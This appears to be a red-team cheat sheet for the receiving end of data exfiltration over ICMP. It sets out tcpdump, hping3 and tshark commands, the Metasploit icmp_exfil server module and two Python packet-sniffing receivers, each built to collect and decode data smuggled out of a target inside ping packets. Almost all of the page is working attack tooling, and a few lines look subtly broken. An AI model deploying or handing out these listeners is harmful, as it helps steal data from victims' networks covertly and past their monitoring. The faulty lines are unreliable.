# Server

## 01 - TCPDump

```
$ tcpdump -i <interface> "icmp and src host <target_IP>" -w file.pcap
```

## 02 - Hping3

The receiver

```
# hping3 -I eth0 --listen <server_IP> --sign MSGID1
```

To extract the data.

```
$ tshark -n -q -r file.pcap -T fields -e data.data | tr -d "\n" | tr -d ":" > hex.txt

$ basenc -d --base16 hex.txt
```

## 03 - Metasploit

```
msf > use auxiliary/server/icmp_exfil

msf auxiliary(server/icmp_exfil) > options

Module options (auxiliary/server/icmp_exfil):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   BPF_FILTER       icmp             yes       BFP format filter to listen for
   END_TRIGGER      ^EOF             yes       Trigger for end of file
   FNAME_IN_PACKET  true             yes       Filename presented in first packet straight after START_TRIGGER
   INTERFACE                         no        The name of the interface
   RESP_CONT        OK               yes       Data ro resond when continuation of data expected
   RESP_END         COMPLETE         yes       Data to response when EOF received and data saved
   RESP_START       SEND             yes       Data to respond when initial trigger matches
   START_TRIGGER    ^BOF             yes       Trigger for beginning of file


View the full module info with the info, or info -d command.

msf auxiliary(server/icmp_exfil) > set interface <interface>

msf auxiliary(server/icmp_exfil) > set icmp and not src <target_IP>

msf auxiliary(server/icmp_exfil) > run -j
```

## 04 - Python Script

```python
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
while True:
    data, src = s.recvfrom(1600)
    payload = data[44:60]
    sys.stdout.write(payload)
```

```python
import sys

try:
	from scapy.all import *
except:
	print("Scapy not found, please install scapy: pip install scapy")
	sys.exit(0)

def process_packet(packet):
	if packet.haslayer(ICMP):
		if packet[ICMP].type == 8:
			data = packet[ICMP].load[-4:]
			print(f'{data.decode("utf-8")}', flush=True, end="", sep="")

sniff(iface="eth0", prn=process_packet)
```

```
$ python3 ping_receiver.py
```

---
## References

### Command Line Kung Fu

- [Command Line Kung Fu: Exfiltration Nation](http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html)

### Ic3M4n

- [Ic3M4n: Can You Hack It - Quick Tips - Data Exfil Over ICMP](https://www.youtube.com/watch?v=IQwl3ZE0rK0)

### ExploitDB

- [ExploitDB: File Transfer Skills in the Red Team Post Penetration Test](https://www.exploit-db.com/docs/english/46515-file-transfer-skills-in-the-red-team-post-penetration-test.pdf)